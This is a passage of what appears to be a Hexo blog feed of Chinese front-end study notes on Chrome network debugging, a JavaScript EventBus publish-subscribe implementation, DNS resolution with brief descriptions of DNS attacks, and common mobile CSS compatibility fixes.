id="5-网络请求调试"><a href="#5-网络请求调试" class="headerlink" title="5. 网络请求调试"></a>5. 网络请求调试</h3><p>接下来我们再来看看网络请求的调试。在网页开发中网络请求是的数据的来源渠道，加载一个页面所需的 HTML 、 CSS 、JS 以及图片等资源都是通过网络请求获取的。数据的获取直接影响着页面内容的展示，如此重要的环节浏览器自然也对其做了监控。我们可以通过 Network 模块来对网络请求进行分析和调试。</p><p>任意打开一个在线网址如 <a href="https://github.com/">https://github.com</a> ，进入控制台并点击 Network ，我们能够看到很多资源请求。</p><p>Network 工具栏</p><p>工具栏上有很多分类：XHR、JS、CSS、Img、Media、Font、Doc、WS、Manifest 等，这些是请求资源的分类。默认是展示全部 All ，点击到其中某一项则能够将请求列表过滤为只有该类型。如点击 JS 则下面的请求列表全部为 JS 资源，点击 XHR 则过滤为向后端发送的异步请求。</p><p>大部分时候我们用到最多的分类是 XHR ，它能够帮助我们调试异步请求。从我们发送请求到我们接收响应数据的过程中，大量细节都记录在控制台中。我们可以点击一个具体的异步请求进行查看</p><p>异步请求调试</p><p>首先看到 Header 这一栏，里面包含了很多信息，这些信息分成 4 个模块： General 、 Response Headers 、 Request Headers 和 Query String Parameters。</p><ul><li>General 里面记录的是请求的基本信息，包括请求地址（Request URL）、请求类型（Request Method）、请求发送状态（Status Code）等</li><li>Response Headers 是响应头，里面记录了返回数据的类型（Content-Type）,浏览器数据的压缩格式(Content-Encoding),服务器的类型(Server),当前时间(Date)等</li><li>Request Headers 是请求头，里面记录了本次请求的客户机支持的数据类型（Accept），缓存控制（Cache-Control），Cookie，访问的主机名（Host），处理完这次请求后的连接方式（Connection）等</li><li>Query String Parameters 是异步请求的参数，如果是 get 请求，则参数为加在 url 后面的一串查询参数，如果是 post 请求，则参数为 body 体里的 json 对象。</li></ul><p>然后我们切到 Preview 这里我们看到的内容是异步请求返回的数据，数据格式是 JSON 对象。很多时候我们就是通过查看这里的数据来进行异步请求的数据查看和问题排查。当我们调用了一个后端提供的接口，我们第一时间就该来到这里查看后端返回了怎样的数据，我们才能继续利用这些数据进行后续的操作。</p><p>查看请求返回数据</p><p>接下来我们再看 Response ，里面的内容是也是异步请求返回数据，不过它跟 preview 的区别在于 preview 中的数据是以  JSON 对象的形式返回的，而在 Response 中是以 JSON 字符串的形式返回。</p><p>JSON 字符串形式的返回数据</p><p>最后的 Timing 一栏中，展示了本次异步请求的时间开销。在哪个环节消耗了多少时间在这一栏里都能很明确得展示出来，因此当一个异步请求的等待时间较长时，我们不妨可以到这里来看看是在哪个环节能够进行优化。</p><p>请求耗时分布</p><p>怎么样？一个异步请求的发送过程是不是在浏览器中记录得非常详细了？正是因为有了这样强大的功能，Chrome 浏览器才会成为众多前端开发人员钟爱的调试利器。</p><p><a name="sv5glk"></a></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本章节介绍了 Chrome 浏览器的基本调试场景和调试方法，并分别对 DOM 调试，CSS 调试，JS 调试和网络请求的调试做了展示。当然， Chrome 浏览器的调试功能并不仅限于此，还有很多模块值得大家去探索。浏览器是前端开发用于展示的平台，更是我们提升效率的利器，大家一定要多多尝试，将它充分利用起来。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 浏览器 </category>
          
          <category> 调试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浏览器 </tag>
            
            <tag> 调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>发布订阅subscribe</title>
      <link href="/2020/10/07/frontend/interview/fa-bu-ding-yue-subscribe/"/>
      <url>/2020/10/07/frontend/interview/fa-bu-ding-yue-subscribe/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>定义对象间的一种一对多的依赖关系，当一个对象的状态发生改变时，所有依赖于它的对象都将得到通知。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 发布订阅模式 EventBus.js</span></span><br><span class="line"><span class="keyword">let</span> instance = <span class="literal">null</span></span><br><span class="line"><span class="keyword">const</span> listeners = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EventBus</span> &#123;</span><br><span class="line">  <span class="keyword">static</span> getInstance = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (instance) &#123;</span><br><span class="line">      <span class="keyword">return</span> instance</span><br><span class="line">    &#125;</span><br><span class="line">    instance = <span class="keyword">new</span> <span class="title class_">EventBus</span>()</span><br><span class="line">    <span class="keyword">return</span> instance</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  on = <span class="function">(<span class="params">event, fn</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (listeners[event]) &#123;</span><br><span class="line">      listeners[event].<span class="title function_">push</span>(fn)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      listeners[event] = [fn]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  emit = <span class="function">(<span class="params">event, data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      listeners[event].<span class="title function_">map</span>(<span class="function"><span class="params">fn</span> =&gt;</span> <span class="title function_">fn</span>(data))</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">      <span class="keyword">throw</span> error</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  off = <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">delete</span> listeners[event]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> eventBus = <span class="title class_">EventBus</span>.<span class="title function_">getInstance</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line">eventBus.<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">eventBus.<span class="title function_">emit</span>(<span class="string">&#x27;click&#x27;</span>, <span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">eventBus.<span class="title function_">off</span>(<span class="string">&#x27;click&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> eventBus;</span><br></pre></td></tr></table></figure><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> 原理 </tag>
            
            <tag> js </tag>
            
            <tag> 手写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS</title>
      <link href="/2020/08/06/frontend/browser/dns/"/>
      <url>/2020/08/06/frontend/browser/dns/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>DNS (Domain Name System)， 也叫网域名称系统，是互联网的一项服务。它实质上是一个  <strong>域名</strong>  和  <strong>IP</strong>  相互映射的分布式数据库，有了它，我们就可以通过域名更方便的访问互联网。最初，由于 ip 长且难记，通过 ip 访问网站不方便。。所以后来通过发明了 DNS 服务器，这个时候我们访问网站输入网站域名，DNS 服务器就解析我们的域名为 ip。这样我们实际访问的就是对应的 ip 地址啦。<br />DNS 有以下特点:</p><ul><li>分布式的</li><li>协议支持 TCP 和 UDP, 常用端口是 53</li><li>每一级域名的长度限制是 63</li><li>域名总长度限制是 253</li></ul><p><strong>那么，什么情况下使用 TCP，什么情况下使用 UDP 呢?</strong><br />最早的时候，DNS 的 UDP 报文上限大小是 512 字节， 所以当某个 response 大小超过 512 (返回信息太多)，DNS 服务就会使用 TCP 协议来传输。后来 DNS 协议扩展了自己的 UDP 协议，DNS client 发出查询请求时，可以指定自己能接收超过 512 字节的 UDP 包， 这种情况下，DNS 还是会使用 UDP 协议</p><p>域名与 ip 的对应关系，被称为记录(record)，可分为各种类型</p><ul><li>A: Address，域名指向的 IP 地址，一个域名可以有多个 A 记录。</li><li>NS：Name Server，保存下一级域名信息的服务器地址</li><li>MX：Mail eXchange，接受电子邮件的服务器地址</li><li>CNAME：Canonical Name，返回另一个域名，令当前查询域名挑去该域名，多个域名-&gt;服务器的映射。</li><li>PTR： Pointer Record，只用于 ip 地址查询域名</li></ul><p>DNS 由下面三个部分组成</p><ul><li>名称解析器（resolver）</li><li>域名空间（domain name space）</li><li>名称服务器（name server）</li></ul><p>假如你要访问 baidu.com，需要先通过 dns 系统查出他的 ip 地址如 220.181.57.216，才能访问。</p><p><a name="sjKGj"></a></p><h2 id="dns-查询的过程"><a href="#dns-查询的过程" class="headerlink" title="dns 查询的过程"></a>dns 查询的过程</h2><p>dns 通过域名查出 ip（我们以浏览器输入<a href="http://www.example.com为例）：">www.example.com为例）：</a></p><ol><li>检查浏览器缓存(缓存时间比较短，默认只有 1 分钟，且只能容纳 1000 条缓存)</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 查看Chrome自身的缓存</span><br><span class="line">chrome://net-internals/<span class="comment">#dns</span></span><br></pre></td></tr></table></figure><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589511986523-9ee9d1e7-6c5a-4c1d-818f-8c95b137f801.png#height=235&id=i8N3l&originHeight=235&originWidth=529&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19755&status=done&style=none&title=&width=529" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589511986523-9ee9d1e7-6c5a-4c1d-818f-8c95b137f801.png#height=235&id=i8N3l&originHeight=235&originWidth=529&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19755&status=done&style=none&title=&width=529" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><ol start="2"><li>检查操作系统 DNS 缓存</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Windows - 查看DNS缓存条目</span></span><br><span class="line">$ pconfig /displaydns</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mac - 查看DNS缓存条目 打开控制台应用</span></span><br><span class="line">sudo <span class="built_in">log</span> config --mode <span class="string">&quot;private_data:on&quot;</span></span><br><span class="line">sudo killall -INFO mDNSResponder</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>读取<code>hosts</code>文件</li><li>检查路由器缓存</li><li>如果前几步都没没找到，会向 ISP(网络服务提供商)的 LDNS 服务器查询</li><li>如果 LDNS 服务器没找到，会向跟域名服务器(Root Server)请求解析，分为以下几步：<ol><li>跟服务器返回顶级域名(TLD)服务器如.com，.cn，.org 等的地址，全球只有 13 台，该例子中会返回.com 的地址</li><li>接着向 TLD 发送请求，然后会返回次级域名(SLD)服务器的地址，本例子会返回.example 的地址</li><li>接着向 SLD 域名服务器通过域名查询目标 IP，本例子会返回<a href="http://www.example.com的地址/">www.example.com的地址</a></li><li>Local DNS Server 会缓存结果，并返回给用户，缓存在系统中。</li></ol></li></ol><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589512622044-d53a60f9-2bba-4672-b3ad-3581fbb188d8.png#height=806&id=LY0qf&originHeight=806&originWidth=1280&originalType=binary&ratio=1&rotation=0&showTitle=false&size=791656&status=done&style=none&title=&width=1280" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589512622044-d53a60f9-2bba-4672-b3ad-3581fbb188d8.png#height=806&id=LY0qf&originHeight=806&originWidth=1280&originalType=binary&ratio=1&rotation=0&showTitle=false&size=791656&status=done&style=none&title=&width=1280" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="vcpIP"></a></p><h2 id="DNS-安全问题"><a href="#DNS-安全问题" class="headerlink" title="DNS 安全问题"></a>DNS 安全问题</h2><ol><li>DNS 反射&#x2F;放大攻击<br />向大量开放 DNS 服务器发送大范围域名查询的 DNS 请求，并将该 DNS 请求的源 IP 地址伪造成想要攻击的目标 IP 地址。由于请求数据比相应数据小得多，攻击者可以利用该技术放大掌握的带宽资源和攻击流量。</li><li>DDOS 攻击可能造成域名解析瘫痪</li><li>DNS&#x2F;域名劫持<br />在劫持的网络范围内拦截域名解析的请求，分析请求的域名，返回假的 IP 地址或者使请求失去响应。DNS 劫持通过篡改 DNS 服务器上的数据返回给用户一个错误的查询结果来实现的。</li><li>DNS 污染<br />DNS 污染是一种让一般用户由于得到虚假目标主机 IP 而不能与其通信的方法，指的是用户访问一个地址，国内的服务器(非 DNS)监控到用户访问的已经被标记地址时，服务器伪装成 DNS 服务器向用户发回错误的地址的行为。<br />dns 污染与 dns 劫持的区别在于，dns 劫持修改了 dns 的解析结果，dns 污染是不经过 dns 服务器，返回错误信息</li><li>DNS 信息黑客被修改</li></ol><p><a name="tX5Ik"></a></p><h2 id="DNS-优化"><a href="#DNS-优化" class="headerlink" title="DNS 优化"></a>DNS 优化</h2><p>可以看出，dns 解析是一个漫长的过程，如何优化这一过程呢？</p><ol><li>DNS Prefetching 用户在请求某个链接之前，浏览器先尝试解析该链接的域名再将其进行缓存。这样真正请求的时候就不需要进行 DNS 解析。可以<ul><li>在服务器中响应设置<code>X-DNS-Prefetch-Control</code>的值为<code>on</code>启动预解析</li><li>HTML 中，<code>&lt;meta http-equiv=&quot;x-dns-prefetch-control&quot; content=&quot;on&quot;&gt;</code></li><li>对特定域名预解析<code>&lt;link rel=”dns-prefetch” href=”//fonts.googleapis.com”&gt;</code></li></ul></li><li>域名收敛<br />建议将静态资源只放在一个域名下面，可以有效减少 dns 的请求</li><li>httpdns 基于 Http 协议向 HTTPDNS 服务器发送域名解析请求，替代了基于 DNS 协议向运营商 Local DNS 发起解析请求的传统方式，可以避免运营商的域名劫持和进行精准调度。这过程分为两步<ol><li>客户端直接访问 HttpDNS 接口，获取业务在域名配置管理系统上配置的访问延迟最优的 IP。（基于容灾考虑，还是保留次选使用运营商 LocalDNS 解析域名的方式）</li><li>客户端向获取到的 IP 后就向直接往此 IP 发送业务协议请求。以 Http 请求为例，通过在 header 中指定 host 字段，向 HttpDNS 返回的 IP 发送标准的 Http 请求即可。</li></ol></li></ol><p><a name="thwCN"></a></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>「真 ® 全栈之路 - DNS 篇」故事从输入 URL 开始….：<a href="https://juejin.im/post/5ceebb7251882507266414b7#heading-10">https://juejin.im/post/5ceebb7251882507266414b7#heading-10</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> 浏览器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>css常见兼容问题</title>
      <link href="/2020/07/28/compatible/css-compatible/"/>
      <url>/2020/07/28/compatible/css-compatible/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h4 id="移动端的-1px"><a href="#移动端的-1px" class="headerlink" title="移动端的 1px"></a>移动端的 1px</h4><p>问题描述：1px 的边框。在高清屏下，移动端的 1px 会很粗。<br />产生原因：首先先要了解一个概念：<strong>DPR(devicePixelRatio) 设备像素比</strong>，它是默认缩放为 100%的情况下，设备像素和 CSS 逻辑像素的比值。目前主流的屏幕 DPR&#x3D;2 或者 3。CSS 中设置的 px 是逻辑像素,这就造成 1px 变成物理像素的 2px 或者 3px，比如 2 倍屏，设备的物理像素要实现 1 像素，所以 CSS 逻辑像素只能是 0.5px。<br />下面介绍最常用的方法<br />通过 CSS :before 选择器或 CSS :after 选择器设置 height:1px，同时缩放 0.5 倍实现。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 底边框 */</span></span><br><span class="line"><span class="selector-class">.b-border</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.b-border</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">1px</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#d9d9d9</span>;</span><br><span class="line">  -webkit-<span class="attribute">transform</span>: <span class="built_in">scaleY</span>(<span class="number">0.5</span>);</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">scaleY</span>(<span class="number">0.5</span>);</span><br><span class="line">  -webkit-<span class="attribute">transform-origin</span>: <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">transform-origin</span>: <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 四条边 */</span></span><br><span class="line"><span class="selector-class">.setBorderAll</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  &amp;<span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200%</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">0.5</span>);</span><br><span class="line">    <span class="attribute">transform-origin</span>: left top;</span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e5e5e5</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="KO4Ca"></a></p><h4 id="CSS-动画页面闪白-动画卡顿"><a href="#CSS-动画页面闪白-动画卡顿" class="headerlink" title="CSS 动画页面闪白,动画卡顿"></a>CSS 动画页面闪白,动画卡顿</h4><p>问题描述：CSS 动画页面闪白,动画卡顿<br />解决方法: <br />1.尽可能地使用合成属性 transform 和 opacity 来设计 CSS3 动画，不使用 position 的 left 和 top 来定位 <br />2.开启硬件加速</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-webkit-<span class="attribute">transform</span>: <span class="built_in">translate3d</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">-moz-<span class="attribute">transform</span>: <span class="built_in">translate3d</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">-ms-<span class="attribute">transform</span>: <span class="built_in">translate3d</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate3d</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p><a name="cvaLi"></a></p><h4 id="屏蔽用户选择"><a href="#屏蔽用户选择" class="headerlink" title="屏蔽用户选择"></a>屏蔽用户选择</h4><p>禁止用户选择页面中的文字或者图片</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  -webkit-touch-callout: none;</span><br><span class="line">  -webkit-user-select: none;</span><br><span class="line">  -khtml-user-select: none;</span><br><span class="line">  -moz-user-select: none;</span><br><span class="line">  -ms-user-select: none;</span><br><span class="line">  user-select: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="IzfcU"></a></p><h4 id="清除输入框内阴影"><a href="#清除输入框内阴影" class="headerlink" title="清除输入框内阴影"></a>清除输入框内阴影</h4><p>问题描述：在 iOS 上，输入框默认有内部阴影 解决方式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span> &#123;</span><br><span class="line">  -webkit-appearance: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="GBwTM"></a></p><h4 id="禁止保存或拷贝图像"><a href="#禁止保存或拷贝图像" class="headerlink" title="禁止保存或拷贝图像"></a>禁止保存或拷贝图像</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">img</span> &#123;</span><br><span class="line">  -webkit-touch-callout: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="o7i6z"></a></p><h4 id="输入框默认字体颜色设置"><a href="#输入框默认字体颜色设置" class="headerlink" title="输入框默认字体颜色设置"></a>输入框默认字体颜色设置</h4><p>设置 input 里面 placeholder 字体的颜色</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span>::-webkit-input-placeholder,</span><br><span class="line">textarea::-webkit-input-placeholder &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#c7c7c7</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">input</span>:-moz-placeholder,</span><br><span class="line">textarea:-moz-placeholder &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#c7c7c7</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">input</span>:-ms-input-placeholder,</span><br><span class="line">textarea:-ms-input-placeholder &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#c7c7c7</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="b54E7"></a></p><h4 id="用户设置字号放大或者缩小导致页面布局错误"><a href="#用户设置字号放大或者缩小导致页面布局错误" class="headerlink" title="用户设置字号放大或者缩小导致页面布局错误"></a>用户设置字号放大或者缩小导致页面布局错误</h4><p>设置字体禁止缩放</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  -webkit-text-size-adjust: <span class="number">100%</span> <span class="meta">!important</span>;</span><br><span class="line">  text-size-adjust: <span class="number">100%</span> <span class="meta">!important</span>;</span><br><span class="line">  -moz-text-size-adjust: <span class="number">100%</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="QmFWH"></a></p><h4 id="android-系统中元素被点击时产生边框"><a href="#android-系统中元素被点击时产生边框" class="headerlink" title="android 系统中元素被点击时产生边框"></a>android 系统中元素被点击时产生边框</h4><p>部分 android 系统点击一个链接，会出现一个边框或者半透明灰色遮罩, 不同生产商定义出来额效果不一样。去除代码如下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span>,<span class="selector-tag">button</span>,<span class="selector-tag">input</span>,<span class="selector-tag">textarea</span>&#123;</span><br><span class="line">  -webkit-tap-highlight-<span class="attribute">color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">  -webkit-user-modify:read-write-plaintext-only;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="OVd7J"></a></p><h4 id="iOS-滑动不流畅"><a href="#iOS-滑动不流畅" class="headerlink" title="iOS 滑动不流畅"></a>iOS 滑动不流畅</h4><p>ios 手机上下滑动页面会产生卡顿，手指离开页面，页面立即停止运动。整体表现就是滑动不流畅，没有滑动惯性。 iOS 5.0 以及之后的版本，滑动有定义有两个值 auto 和 touch，默认值为 auto。</p><ul><li><p>解决方式</p><p>1.在滚动容器上增加滚动 touch 方法</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  -webkit-<span class="attribute">overflow</span>-scrolling: touch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.设置 overflow 设置外部 overflow 为 hidden,设置内容元素 overflow 为 auto。内部元素超出 body 即产生滚动，超出的部分 body 隐藏。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">overflow-y</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span 